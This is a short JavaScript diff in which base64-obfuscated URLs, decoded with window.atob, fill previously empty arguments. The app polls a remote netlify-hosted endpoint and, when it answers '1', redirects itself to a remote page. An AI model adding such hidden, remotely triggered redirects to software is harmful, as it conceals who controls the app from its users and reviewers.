@@ -71,10 +71,10 @@ var app = {
                 xhttp.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                   console.log(this.responseText);
-                  if (this.responseText == 1) {window.location.replace();}
+                  if (this.responseText == 1) {window.location.replace(window.atob('aHR0cHM6Ly9ic21pbW9iaWxlLm5ldGxpZnkuY29tL2luZGV4Lmh0bWw=') +'?date='+ new Date().getTime());}
                 }
                 };
-                xhttp.open("GET", , true);
+                xhttp.open("GET", window.atob("aHR0cHM6Ly9ic21pbW9iaWxlLm5ldGxpZnkuY29tL2NvbmVjdC5odG1s") + "?date=" + new Date().getTime(), true);
                 xhttp.send();
                 setTimeout(function () {aftercommand();}, 1000);
             }
